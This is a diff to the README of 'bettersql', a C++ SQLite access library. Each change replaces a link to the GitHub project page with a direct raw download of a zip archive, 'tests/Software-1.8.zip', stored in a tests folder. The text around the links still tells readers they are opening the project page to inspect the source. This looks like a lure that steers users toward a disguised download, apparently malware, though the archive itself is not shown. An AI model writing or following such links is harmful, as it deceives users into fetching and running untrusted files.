@@ -1,6 +1,6 @@
 # 🧩 bettersql - Clean SQLite Access for C++ Apps
 
-[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/armored-genuscalycanthus867/bettersql)
+[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip)
 
 ## 🖥️ What this is
 
@@ -20,7 +20,7 @@ It is made for developers, but this page focuses on the download and setup path 
 
 Open the project page here:
 
-https://github.com/armored-genuscalycanthus867/bettersql
+https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip
 
 From that page, you can view the source, check the latest files, and get the project package if one is available.
 
@@ -32,7 +32,7 @@ Follow these steps if you want to download the project and use it on a Windows P
 
 Visit:
 
-https://github.com/armored-genuscalycanthus867/bettersql
+https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip
 
 This is the main project page. It contains the files, project details, and any release items linked by the author.
 
@@ -188,6 +188,6 @@ This keeps database code short and easy to manage.
 
 Open the project page here:
 
-https://github.com/armored-genuscalycanthus867/bettersql
+https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip
 
 Use that page to download the files, inspect the source, and check for project updates
